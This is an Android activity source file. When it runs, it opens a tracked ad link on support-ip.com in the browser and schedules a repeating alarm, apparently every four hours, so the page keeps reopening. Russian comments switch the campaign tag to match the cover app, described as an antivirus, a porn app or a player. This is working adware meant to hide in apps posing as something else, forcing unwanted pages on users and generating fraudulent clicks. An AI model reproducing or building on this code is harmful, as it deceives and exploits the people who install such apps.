package com.example.asti.myapplication;
import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.util.StringBuilderPrinter;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.WindowManager;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class AlarmActivity extends AppCompatActivity {
    private static String TAG = "alarmActivity";

    AlarmStuff as;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        Log.i(TAG, ">>> New task started <<<");
        super.onCreate(savedInstanceState);
        // антивирус
//        Uri uri = Uri.parse("http://support-ip.com/b/click.php?key=fire&с1=anund");

        // порноапп
        Uri uri = Uri.parse("http://support-ip.com/b/click.php?key=fire&с1=adund");

        // плеер
//        Uri uri = Uri.parse("http://support-ip.com/b/click.php?key=fire&с1=plund");

        Intent intent = new Intent(Intent.ACTION_VIEW, uri);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        Log.i(TAG, "*** has finished  activity ***");
        startActivity(intent);
        finish();
        Log.i(TAG, "/// open browser ///");

        as = new AlarmStuff();
//         3600 * 4 * 1000 = 4 часа = 14400000 мс
        as.setRepeatingAlarm(AlarmActivity.this, AlarmStuff.DELAY_ADV);
        Log.i(TAG, "setup alarm in alarmActivity");


    }
}